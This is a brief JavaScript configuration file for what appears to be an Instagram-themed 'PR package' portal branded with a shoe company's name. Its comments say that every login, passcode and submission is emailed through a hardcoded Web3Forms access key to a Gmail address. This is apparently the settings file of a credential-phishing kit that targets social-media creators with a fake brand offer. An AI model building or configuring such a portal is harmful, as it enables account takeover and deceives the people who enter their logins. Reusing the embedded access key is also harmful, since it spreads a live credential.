// Configuration for Instagram PR Portal & Email
const PR_CONFIG = {
  // Destination email where the submitted PR details and passcodes should be delivered
  // Replace with your actual email address
  recipientEmail: "notificationsjoincognizant@gmail.com",
  
  // Brand details
  brandName: "COMET SHOES PVT.",
  campaignName: "Creator PR Package Drop",
  
  // Web3Forms Access Key: Free direct inbox delivery without backend.
  // Get a free key instantly in 10 seconds from https://web3forms.com
  // Once pasted here, every login & submission sends an instant email to recipientEmail
  web3FormsAccessKey: "fc079492-2c34-4327-89c2-8ef6c9a59387" 
};

if (typeof module !== 'undefined') {
  module.exports = PR_CONFIG;
}

